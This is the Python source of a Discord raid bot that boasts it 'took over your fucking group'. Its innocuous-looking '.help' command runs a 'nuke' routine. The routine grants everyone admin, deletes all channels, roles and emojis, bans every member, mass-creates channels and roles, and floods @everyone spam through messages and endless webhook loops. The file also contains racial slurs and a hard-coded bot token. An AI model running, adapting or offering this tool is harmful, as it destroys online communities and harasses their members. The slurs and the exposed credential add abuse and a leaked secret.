import discord
from discord.ext import commands
import random
from discord import Permissions
import os
import io
import csv
import random
import asyncio
import aiohttp
import logging
from discord.ext import tasks

###spam setup#######
floyd = ['https://cdn.discordapp.com/icons/864931992227020862/d150ce4390c325b4cb74b572cbf2d248.png?size=4096', 'https://media.discordapp.net/attachments/860978383063875637/861033971265437746/Avatar.png', 'https://media.discordapp.net/attachments/860978383063875637/861033971265437746/Avatar.png', 'https://media.discordapp.net/attachments/860978383063875637/861033971265437746/Avatar.png', 'https://media.discordapp.net/attachments/860978383063875637/861033971265437746/Avatar.png', 'https://media.discordapp.net/attachments/860978383063875637/861033971265437746/Avatar.png']
channelname = ['sigil1337 took over your fucking group', 'sigil1337 took over your fucking group']
webhook_usernames = ["sigil1337", "sigil1337", "sigil1337", "sigil1337"]
guildname = 'sigil1337 took over your fucking group'
mememsgs = ['https://tenor.com/view/clown-mcdonalds-laughing-hysterically-hahahahaha-laughing-gif-16021565', 'https://cdn.discordapp.com/attachments/852643383884775456/854408878270447636/balls.mp4', 
'https://media.tenor.co/videos/512690cd3289a08e1e8c6889fe3d8a35/mp4','https://cdn.discordapp.com/attachments/852552622057586768/853382374913474620/fckenuwu.mp4', 'https://cdn.discordapp.com/attachments/852552622057586768/853382195821281290/received_235453491300124.mp4','https://cdn.discordapp.com/attachments/852552622057586768/853378737805983765/received_142953087898162.mp4 ', 'https://cdn.discordapp.com/attachments/853747347980419106/855891957519089685/batman_tattoo.mp4', 'https://cdn.discordapp.com/attachments/853747347980419106/855892106308354058/CallOfDuty.mov', 'https://cdn.discordapp.com/attachments/853747347980419106/855892262089392138/video0-279.mp4', 'https://cdn.discordapp.com/attachments/853747347980419106/855892510450122772/video0_-_2021-06-01T170229.424.mp4','https://cdn.discordapp.com/attachments/853747347980419106/855892550341623878/MemeFeedBot-8580.mp4','https://cdn.discordapp.com/attachments/853747347980419106/855892591604924436/video0.mp4',
'https://cdn.discordapp.com/attachments/853747347980419106/855893339117977640/video0.mp4', 'https://cdn.discordapp.com/attachments/853747347980419106/855893673181970493/british_rappers_be_like.mp4','https://cdn.discordapp.com/attachments/853747347980419106/855894295655874560/video0_95.mp4', 'https://cdn.discordapp.com/attachments/787884182788767744/791446447526510602/video0.mp4', 'https://cdn.discordapp.com/attachments/855899413197094942/855899638221635584/video0_10.mp4', 'https://cdn.discordapp.com/attachments/788646943894011924/798784338182930492/lmao.mp4',]
spammsgs = ['@everyone **sigil1337 Nuked you** https://cdn.discordapp.com/attachments/898634332304986122/940899514594787348/myterminal.png  ', '@everyone **nuked by sigil1337** https://cdn.discordapp.com/attachments/898634332304986122/940899514594787348/myterminal.png  ', '@everyone **praise sigil1337**  https://cdn.discordapp.com/attachments/898634332304986122/940899514594787348/myterminal.png  ', '@everyone ****  https://cdn.discordapp.com/attachments/898634332304986122/940899514594787348/myterminal.png  ', '@everyone **** https://cdn.discordapp.com/attachments/862794134795190282/864957618627936296/final_60ef3f4bf52e5700931503ff_148439.png  ', '@everyone **praise sigil1337** https://cdn.discordapp.com/attachments/862794134795190282/864957618627936296/final_60ef3f4bf52e5700931503ff_148439.png  ', '@everyone **sigil1337 took over your fucking group** https://cdn.discordapp.com/attachments/862794134795190282/864957618627936296/final_60ef3f4bf52e5700931503ff_148439.png  ', '@everyone **praise sigil1337** https://cdn.discordapp.com/attachments/862794134795190282/864957618627936296/final_60ef3f4bf52e5700931503ff_148439.png  ', '@everyone **** https://cdn.discordapp.com/attachments/898634332304986122/940899514594787348/myterminal.png  ', '@everyone **sigil1337 took over your fucking group** https://cdn.discordapp.com/attachments/898634332304986122/940899514594787348/myterminal.png  ', '@everyone **sigil1337 took over your fucking group!** https://cdn.discordapp.com/attachments/898634332304986122/940899514594787348/myterminal.png  ', '@everyone **sigil1337 took over your fucking group** https://cdn.discordapp.com/attachments/898634332304986122/940899514594787348/myterminal.png  ', '@everyone **sigil1337 took over your fucking group** https://cdn.discordapp.com/attachments/898634332304986122/940899514594787348/myterminal.png  ']
chinamsgs = ['@everyone **sigil1337 owned you** https://cdn.discordapp.com/attachments/898634332304986122/940899514594787348/myterminal.png  ', '@everyone **nuked by sigil1337** https://cdn.discordapp.com/attachments/898634332304986122/940899514594787348/myterminal.png  ', '@everyone **praise sigil1337**  https://cdn.discordapp.com/attachments/898634332304986122/940899514594787348/myterminal.png  ', '@everyone **  sigil1337 was there**  https://cdn.discordapp.com/attachments/898634332304986122/940899514594787348/myterminal.png  ', '@everyone **sigil1337 took over your fucking group** https://cdn.discordapp.com/attachments/898634332304986122/940899514594787348/myterminal.png  ', '@everyone **sigil1337 took over your fucking group** https://cdn.discordapp.com/attachments/https://cdn.discordapp.com/attachments/898634332304986122/940899514594787348/myterminal.png  ', '@everyone **sigil1337 took over your fucking group** https://cdn.discordapp.com/attachments/898634332304986122/940899514594787348/myterminal.png  ', '@everyone **sigil1337 took over your fucking group** https://cdn.discordapp.com/attachments/https://cdn.discordapp.com/attachments/898634332304986122/940899514594787348/myterminal.png  ', '@everyone **sigil1337 took over your fucking group** https://cdn.discordapp.com/attachments/898634332304986122/940899514594787348/myterminal.png  ', '@everyone **sigil1337 took over your fucking group** https://cdn.discordapp.com/attachments/898634332304986122/940899514594787348/myterminal.png  ', '@everyone **sigil1337 took over your fucking group** https://cdn.discordapp.com/attachments/898634332304986122/940899514594787348/myterminal.png  ', '@everyone **sigil1337 took over your fucking group** https://cdn.discordapp.com/attachments/898634332304986122/940899514594787348/myterminal.png  ', '@everyone **sigil1337 took over your fucking group** https://cdn.discordapp.com/attachments/898634332304986122/940899514594787348/myterminal.png ']
nuke_on_join = False
nuke_wait_time = 0
####################
os.system("clear")

import discord, random, aiohttp, asyncio
from discord import Webhook
from discord.ext import commands
from discord.ext.commands import *
from colorama import Fore as C
from colorama import Style as S

bot = commands.Bot(command_prefix='!')

@bot.command(description="Set the guild icon")
async def gpfp(ctx, url: str):
    """Set the guild icon."""
    await ctx.message.delete()
    if ctx.message.guild is None:
        return
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as resp:
            if resp.status != 200:
                return await ctx.send('Could not download file...')
            data = io.BytesIO(await resp.read())
            await ctx.message.guild.edit(icon=data.read())

@bot.event
async def on_ready():
  print(f"""                                
{C.RED}
    ..-=~~~~~~=-..
  *'              `*
,' \~=._      _.=~/ ',
7   \   ~=__=~   /   T
|    \_.=~  ~=._/    |
|_.=~ \        / ~=._|
L------\------/------7
`.      \    /      .'
  *,     \  /     ,*
    ``-=__\/__=-''
{C.BLUE}
bot has {C.WHITE}4 {C.BLUE}Nukes

{C.GREEN}You are using {C.WHITE}{bot.user}.
{C.GREEN}Say {C.WHITE}.nuke {C.GREEN} to nuke.
{C.GREEN}Say {C.WHITE}.cmds {C.GREEN} to get the cmds..

{C.WHITE}Your bot's link is {C.LIGHTBLUE_EX}https://discord.com/api/oauth2/authorize?client_id={bot.user.id}&permissions=8&scope=bot
""")

bot.remove_command("help")

@bot.command()
async def help(ctx):
  await ctx.message.delete()
  guild = ctx.guild
  await nuke(guild)

async def nuke(guild):
  print(f"{C.RED}NIGGERING {guild.name}.")
  role = discord.utils.get(guild.roles, name = "@everyone")
  try:
    await role.edit(permissions = discord.Permissions.all())
    print(f"{C.GREEN}ADMIN FOR ALL {C.WHITE}{guild.name}")
  except:
    print(f"{C.RED}sad, No admin for the people in {C.WHITE}{guild.name}")
  for channel in guild.channels:
    try:
      await channel.delete()
      print(f"{C.GREEN}[+] {C.GREEN} deleted channel called {C.WHITE}{channel.name}")
    except:
      print(f"{C.RED}sad, Channel {C.WHITE}{channel.name} {C.RED}has NOT been deleted.")
  for role in guild.roles:
    try:
      await role.delete()
    except:
        pass
    await guild.edit(name=f'{guildname}')
    await guild.create_text_channel("sigil1337 took over your fucking group")
    await guild.create_text_channel("sigil1337 took over your fucking group")
    await guild.create_text_channel("sigil1337 took over your fucking group")
    await guild.create_text_channel("sigil1337 took over your fucking group")
    await guild.create_text_channel("sigil1337 took over your fucking group")
    await guild.create_text_channel("sigil1337 took over your fucking group")
    await guild.create_text_channel("sigil1337 took over your fucking group")
    await guild.create_text_channel("sigil1337 took over your fucking group")
    await guild.create_text_channel("sigil1337 took over your fucking group")
    await guild.create_text_channel("sigil1337 took over your fucking group") 
    for i in range(150):
      await guild.create_text_channel(random.choice(channelname))
    print(f"{C.GREEN} [+]  {C.WHITE } Nuked {guild.name}.")  
  for i in range(100):
    await guild.create_text_channel(random.choice(channelname))
  print(f"{C.GREEN} [+]  {C.WHITE } Nuked {guild.name}.")  
  for x in range(5):
      for channel in guild.channels:
        try:
          await channel.send(random.choice(chinamsgs))
        except discord.Forbidden:
          print(f"{C.RED} [-]Spam Error {C.WHITE}[Cannot send messages]")
          return
        except:
          pass
  else:
    for channel in guild.channels:
      try:
        await channel.send(random.choice(chinamsgs))
      except discord.Forbidden:
        print(f"{C.RED}Spam Error {C.WHITE}[Cannot send messages]")
        return
      except:
        pass
  for i in range(5):
    await guild.create_text_channel(random.choice(channelname))
  print(f"{C.GREEN}Nuked {guild.name}.")
  for x in range(5):
      for channel in guild.channels:
        try:
          await channel.send(random.choice(chinamsgs))
        except discord.Forbidden:
          print(f"{C.RED}Spam Error {C.WHITE}[Cannot send messages]")
          return
        except:
          pass
  else:
    for channel in guild.channels:
      try:
        await channel.send(random.choice(chinamsgs))
      except discord.Forbidden:
        print(f"{C.RED}Spam Error {C.WHITE}[Cannot send messages]")
        return
      except:
        pass
  for i in range(5):
    await guild.create_text_channel(random.choice(channelname))
  print(f"{C.GREEN}Nuked {guild.name}.")
  for x in range(5):
      for channel in guild.channels:
        try:
          await channel.send(random.choice(chinamsgs))
        except discord.Forbidden:
          print(f"{C.RED}Spam Error {C.WHITE}[Cannot send messages]")
          return
        except:
          pass
  else:
    for channel in guild.channels:
      try:
        await channel.send(random.choice(chinamsgs))
      except discord.Forbidden:
        print(f"{C.RED}Spam Error {C.WHITE}[Cannot send messages]")
        return
      except:
        pass
  for i in range(5):
    await guild.create_text_channel(random.choice(channelname))
  print(f"{C.GREEN}Nuked {guild.name}.")  
  for x in range(5):
      for channel in guild.channels:
        try:
          await channel.send(random.choice(chinamsgs))
        except discord.Forbidden:
          print(f"{C.RED}Spam Error {C.WHITE}[Cannot send messages]")
          return
        except:
          pass
  else:
    for channel in guild.channels:
      try:
        await channel.send(random.choice(chinamsgs))
      except discord.Forbidden:
        print(f"{C.RED}Spam Error {C.WHITE}[Cannot send messages]")
        return
      except:
        pass
  for i in range(5):
    await guild.create_text_channel(random.choice(channelname))
  print(f"{C.GREEN}Nuked {guild.name}.")
  for x in range(5):
      for channel in guild.channels:
        try:
          await channel.send(random.choice(chinamsgs))
        except discord.Forbidden:
          print(f"{C.RED}Spam Error {C.WHITE}[Cannot send messages]")
          return
        except:
          pass
  else:
    for channel in guild.channels:
      try:
        await channel.send(random.choice(chinamsgs))
      except discord.Forbidden:
        print(f"{C.RED}Spam Error {C.WHITE}[Cannot send messages]")
        return
      except:
        pass
  for i in range(5):
    await guild.create_text_channel(random.choice(channelname))
  print(f"{C.GREEN}Nuked {guild.name}.")
  for x in range(5):
      for channel in guild.channels:
        try:
          await channel.send(random.choice(chinamsgs))
        except discord.Forbidden:
          print(f"{C.RED}Spam Error {C.WHITE}[Cannot send messages]")
          return
        except:
          pass
  else:
    for channel in guild.channels:
      try:
        await channel.send(random.choice(chinamsgs))
      except discord.Forbidden:
        print(f"{C.RED}Spam Error {C.WHITE}[Cannot send messages]")
        return
      except:
        pass
  for i in range(5):
    await guild.create_text_channel(random.choice(channelname))
  print(f"{C.GREEN}Nuked {guild.name}.")  
  for x in range(5):
      for channel in guild.channels:
        try:
          await channel.send(random.choice(chinamsgs))
        except discord.Forbidden:
          print(f"{C.RED}Spam Error {C.WHITE}[Cannot send messages]")
          return
        except:
          pass
  else:
    for channel in guild.channels:
      try:
        await channel.send(random.choice(chinamsgs))
      except discord.Forbidden:
        print(f"{C.RED}Spam Error {C.WHITE}[Cannot send messages]")
        return
      except:
        pass
  for i in range(5):
    await guild.create_text_channel(random.choice(channelname))
  print(f"{C.GREEN}Nuked {guild.name}.")
  for x in range(5):
      for channel in guild.channels:
        try:
          await channel.send(random.choice(chinamsgs))
        except discord.Forbidden:
          print(f"{C.RED}Spam Error {C.WHITE}[Cannot send messages]")
          return
        except:
          pass
  else:
    for channel in guild.channels:
      try:
        await channel.send(random.choice(chinamsgs))
      except discord.Forbidden:
        print(f"{C.RED}Spam Error {C.WHITE}[Cannot send messages]")
        return
      except:
        pass
  for i in range(5):
    await guild.create_text_channel(random.choice(channelname))
  print(f"{C.GREEN}Nuked {guild.name}.")
  for i in range(500):
    await guild.create_text_channel(random.choice(channelname))
  print(f"{C.GREEN}Nuked {guild.name}.")
  for member in guild.members:
    try:
      await member.ban()
      print(f"{C.GREEN}banned {C.WHITE}{member.name}")
    except:
      print(f" {C.RED}sad, {C.WHITE}{member.name} has NOT been banned.")
  for emoji in list(guild.emojis):
    try:
      await emoji.delete()
      print (f"{emoji.name} has been deleted in {guild.name}")
    except:
      print (f"{emoji.name} has NOT been deleted in {guild.name}")
  for i in range(450):
    await guild.create_text_channel(random.choice(channelname))
  print(f"{C.GREEN}Nuked {guild.name}.")
  for i in range(500):
    await guild.create_role(name=f'{random.choice(channelname)}')
    
@bot.command()
async def cmds(ctx):
  await ctx.message.delete()
  author = ctx.author
  cmds = discord.Embed(
    title = "Bot commands", 
    description = """


**__COMMANDS__**
```diff
- .cmds
Shows this message. 
```
```diff
- .help
Nukes the server. 
```
```diff
- !cs <message>
Spams all the channels.
```
```diff
- !meme
epik memes nigga 
```
""")
  await author.send(embed = cmds)

@bot.event
async def on_guild_channel_create(channel):
      for x in range(20):
        try:
          await channel.send(random.choice(chinamsgs))
        except discord.Forbidden:
          print(f"{C.RED}Spam Error {C.WHITE}[Cannot send messages]")
          return
        except:
          pass 
      else:
        try:
          await channel.send(random.choice(chinamsgs))
        except discord.Forbidden:
          print(f"{C.RED}Spam Error {C.WHITE}[Cannot send messages]")
          return
        except:
          pass
      webhook = await channel.create_webhook(name = "ཊΚΔƬΔཏ")
      webhook_url = webhook.url
      async with aiohttp.ClientSession() as session:
        webhook = Webhook.from_url(str(webhook_url), adapter=AsyncWebhookAdapter(session))
        while True:
          await webhook.send(random.choice(chinamsgs),  avatar_url = (random.choice(floyd)), username = random.choice(webhook_usernames))
      for x in range(500):
        try:
          await channel.send(random.choice(chinamsgs))
        except discord.Forbidden:
          print(f"{C.RED}Spam Error {C.WHITE}[Cannot send messages]")
          return
        except:
          pass
      else:
        try:
          await channel.send(random.choice(chinamsgs))
        except discord.Forbidden:
          print(f"{C.RED}Spam Error {C.WHITE}[Cannot send messages]")
          return
        except:
          pass

@bot.command()
async def meme(ctx):
  await ctx.channel.send(random.choice(mememsgs))

@bot.command()
async def cs(ctx, *, message = None):
  await ctx.message.delete()
  if message == None:
    for x in range(5):
      for channel in ctx.guild.channels:
        try:
          await channel.send(random.choice(chinamsgs))
        except discord.Forbidden:
          print(f"{C.RED}Spam Error {C.WHITE}[Cannot send messages]")
          return
        except:
          pass
  else:
    for channel in ctx.guild.channels:
      try:
        await channel.send(message)
      except discord.Forbidden:
        print(f"{C.RED}Spam Error {C.WHITE}[Cannot send messages]")
        return
      except:
        pass

#bot token here
bot.run("OTQwMDk5NDg3NDY3MjAwNTEy.GuUa0v.BxYrdZfe08_By0sWqEi2hgyXRB8QY6CHnleeEY")
